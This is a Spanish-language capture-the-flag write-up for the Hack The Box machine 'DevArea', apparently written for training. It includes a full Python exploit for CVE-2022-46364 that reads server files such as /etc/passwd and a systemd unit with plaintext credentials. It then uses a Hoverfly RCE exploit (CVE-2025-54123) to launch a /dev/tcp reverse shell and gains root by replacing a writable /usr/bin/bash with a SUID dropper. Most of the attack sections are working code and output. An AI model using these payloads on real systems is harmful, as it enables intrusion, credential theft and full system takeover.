---
title: DevArea
description: DevArea
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - htb
  - linux
  - medium
  - cve-2022-46364
  - cve-2025-54123
  - ssrf
  - lfi
  - soap
  - hoverfly
  - suid
  - sudo-abuse
---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sSCV -Pn 10.129.34.207

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-title: Error 404 Not Found
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
8500/tcp open  http    Golang net/http server
    This is a proxy server. Does not respond to non-proxy requests.
```

```bash
echo "10.129.34.207 devarea.htb" | sudo tee -a /etc/hosts
```

### Enumeración FTP anónimo

```bash
ftp 10.129.34.207

Name: anonymous
230 Login successful.
ftp> cd pub
ftp> ls
-rw-r--r-- 1 ftp ftp 6445030 Sep 22 2025 employee-service.jar
```

```bash
ftp> get employee-service.jar

100% |****| 6293 KiB  2.67 MiB/s  00:00 ETA
226 Transfer complete.
```

### Enumeración del servicio SOAP en puerto 8080

```bash
curl "http://devarea.htb:8080/employeeservice?wsdl"
```

```bash
<xs:element minOccurs="0" name="content" type="xs:string"/>
<xs:element minOccurs="0" name="department" type="xs:string"/>
<xs:element minOccurs="0" name="employeeName" type="xs:string"/>
<soap:address location="http://devarea.htb:8080/employeeservice"/>
```

> El servicio SOAP expone un método `submitReport` con un campo `content` de tipo string. El servidor usa **Apache CXF sobre Jetty 9.4.27** — vulnerable a CVE-2022-46364.
> 

---

## 2. Vector de entrada — CVE-2022-46364: CXF SSRF/File Read

**CVE-2022-46364** afecta a Apache CXF cuando procesa mensajes MTOM (Multipart SOAP). El campo `content` acepta un elemento XOP `Include` con un atributo `href`. CXF resuelve ese `href` en el servidor antes de devolver la respuesta — si apunta a `file:///etc/passwd`, el servidor lee el archivo y devuelve su contenido en base64 en la respuesta SOAP.

### Paso 1 — Confirmar la lectura de archivos con /etc/passwd

```bash
# exploit.py — CVE-2022-46364 Apache CXF MTOM/XOP SSRF File Read
import requests, base64, re, sys

TARGET = "http://devarea.htb:8080/employeeservice"

def read_file(filepath):
    boundary = "----=_Part_0_12345"
    content_id = "<root@example.com>"
    headers = {
        "Content-Type": (
            f'multipart/related; type="application/xop+xml"; '
            f'start="{content_id}"; boundary="{boundary}"; '
            f'start-info="text/xml"'
        )
    }
    soap_body = f"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">
  <soapenv:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://{filepath}"/></content>
        <department>test</department>
        <employeeName>test</employeeName>
      </arg0>
    </tns:submitReport>
  </soapenv:Body>
</soapenv:Envelope>"""

    body = (
        f"--{boundary}\r\n"
        f'Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n'
        f"Content-ID: {content_id}\r\n\r\n"
        f"{soap_body}\r\n"
        f"--{boundary}--"
    )
    r = requests.post(TARGET, headers=headers, data=body.encode(), timeout=10)
    match = re.search(r'Content:\s*([A-Za-z0-9+/=]+)', r.text)
    if match:
        return base64.b64decode(match.group(1)).decode('utf-8', errors='replace')
    match = re.search(r'<return>(.*?)</return>', r.text, re.DOTALL)
    if match:
        return base64.b64decode(match.group(1).strip()).decode('utf-8', errors='replace')

if __name__ == "__main__":
    print(read_file(sys.argv[1]))
```

```bash
python3 exploit.py /etc/passwd

root:x:0:0:root:/root:/bin/bash
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

### Paso 2 — Leer el servicio systemd de Hoverfly para extraer credenciales

```bash
python3 exploit.py /etc/systemd/system/hoverfly.service

[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0`

admin : O7IJ27MyyXiU
```

> Las credenciales son válidas para el dashboard de Hoverfly en `http://10.129.34.207:8888`. Login confirmado.
> 

---

## 3. Acceso inicial — CVE-2025-54123: Hoverfly RCE

**CVE-2025-54123** afecta a Hoverfly v1.11.3. La feature de *middleware* permite registrar un script externo que se ejecuta por el servidor para procesar peticiones simuladas. Un usuario autenticado puede subir un script malicioso y forzar su ejecución en el contexto del proceso — **RCE autenticado**.

### Paso 1 — Verificar versión y confirmar RCE

```bash
git clone https://github.com/f4dee-backup/CVE-2025-54123
./CVE-2025-54123.sh -t http://10.129.34.207:8888 -u admin -p O7IJ27MyyXiU -c "id"

[INFO] Detected version: v1.11.3
[OK] Vulnerable version detected: 1.11.3
[OK] Command executed successfully.

uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

### Paso 2 — Obtener reverse shell

```bash
nc -lvnp 1234
```

```bash
./CVE-2025-54123.sh \
  -t http://10.129.34.207:8888 \
  -u admin \
  -p O7IJ27MyyXiU \
  -c "bash -i >& /dev/tcp/10.10.14.187/1234 0>&1"

listening on [any] 1234 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.34.207] 54430
bash: cannot set terminal process group (1409): Inappropriate ioctl for device
dev_ryan@devarea:/opt/HoverFly$
```

```bash
cat /home/dev_ryan/user.txt

[user flag]
```

---

## 4. Escalada de privilegios — Writable /usr/bin/bash + Sudo NOPASSWD

### Paso 1 — Identificar el vector

```bash
sudo -l

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
```

```bash
head -1 /opt/syswatch/syswatch.sh

#!/bin/bashbash
```

```bash
ls -la /usr/bin/bash

- rwxr-xr-x 1 dev_ryan dev_ryan 1396520 /usr/bin/bash
```

> `dev_ryan` **es el propietario** de `/usr/bin/bash`. El script tiene el shebang `#!/bin/bash` que resuelve a `/usr/bin/bash`. Cuando root ejecuta `syswatch.sh` via sudo, el kernel interpreta el shebang y lanza `/usr/bin/bash` como UID=0. Si reemplazamos ese binario con un dropper, root ejecutará nuestro código.
> 

**Flujo de explotación:**

```bash
sudo syswatch.sh → kernel lee #!/bin/bash → ejecuta /usr/bin/bash como UID=0
                                                    ↓
                                         NUESTRO SCRIPT corre como root
                                                    ↓
                                    crea /tmp/rootbash con SUID 4755
```

### Paso 2 — Hacer backup y cambiar a sh para liberar el binario

```bash
cp /usr/bin/bash /tmp/bash.bak
sh
```

### Paso 3 — Identificar y matar los procesos que usan /usr/bin/bash

```bash
lsof /usr/bin/bash

COMMAND   PID     USER FD   TYPE  NODE NAME
bash     2134 dev_ryan txt   REG       /usr/bin/bash
bash     2135 dev_ryan txt   REG       /usr/bin/bash

kill -9 2134 2135
```

### Paso 4 — Reemplazar /usr/bin/bash con el dropper SUID

```bash
cat > /usr/bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

### Paso 5 — Disparar la ejecución como root via sudo

```bash
sudo /opt/syswatch/syswatch.sh web-status
```

### Paso 6 — Ejecutar el binario SUID y leer root flag

> `-p` evita que bash moderno descarte el EUID si detecta UID real ≠ EUID efectivo.
> 

```bash
/tmp/rootbash -p

id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) groups=1001(dev_ryan)

cat /root/root.txt
[root flag]
```

### Paso 7 — Restaurar el binario original

```bash
cp /tmp/bash.bak /usr/bin/bash
```

---

---

## 6. Lecciones aprendidas

- **CVE-2022-46364 convierte un SOAP genérico en LFI/SSRF total.** Si el servidor procesa MTOM/XOP y no filtra el scheme `file://`, cualquier archivo legible por el proceso del servidor es accesible. El vector más útil es siempre leer unit files de systemd — contienen credenciales en texto claro en el `ExecStart`.
- **Los dashboards internos en puertos altos son objetivos prioritarios.** Hoverfly en 8888 no estaba detrás de autenticación de red — solo de usuario/contraseña que estaba hardcodeada en el unit file expuesto por el SSRF.
- **Ser propietario de /usr/bin/bash es escalada directa si hay un sudo que lo invoca via shebang.** El kernel confía en el shebang del script y ejecuta el intérprete declarado como root. No hace falta WriteDACL ni nada especial — solo ser owner del fichero.
- **Siempre hacer backup antes de sobreescribir binarios del sistema.** Sin `/tmp/bash.bak` no hay intérprete para el dropper ni forma de restaurar.
- **`bash -p` es necesario con binarios SUID en bash moderno.** Desde bash 4+, si el UID real no coincide con el EUID, bash descarta los privilegios a menos que se pase `p` explícitamente.
- **En máquinas similares buscar:** servicios con credenciales en `ExecStart` de systemd, aplicaciones web que soporten middleware/plugins ejecutables (Hoverfly, Jenkins, etc.), propiedad de binarios del sistema en `/usr/bin` o `/usr/local/bin`, scripts sudo con shebang a binarios escribibles.